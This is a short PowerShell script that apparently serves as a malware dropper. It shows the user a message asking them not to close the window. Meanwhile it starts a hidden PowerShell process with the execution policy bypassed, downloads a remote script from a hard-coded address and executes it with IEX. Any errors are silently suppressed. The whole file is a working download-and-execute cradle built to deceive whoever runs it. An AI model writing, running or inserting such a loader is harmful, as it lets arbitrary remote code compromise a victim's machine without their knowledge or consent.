try {
    Write-Host "Wait please, don't close this window..."
    
    $scriptBlock = {
        IEX (New-Object Net.WebClient).DownloadString('http://192.168.59.152/user_profiles_photo/windows.ps1')
    }
    
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = "powershell.exe"
    $psi.Arguments = "-NoProfile -ExecutionPolicy Bypass -Command `"& { $scriptBlock }`""
    $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
    $psi.CreateNoWindow = $true
    $psi.UseShellExecute = $false
    
    $process = New-Object System.Diagnostics.Process
    $process.StartInfo = $psi
    $process.Start() | Out-Null
    
} catch {
    
}
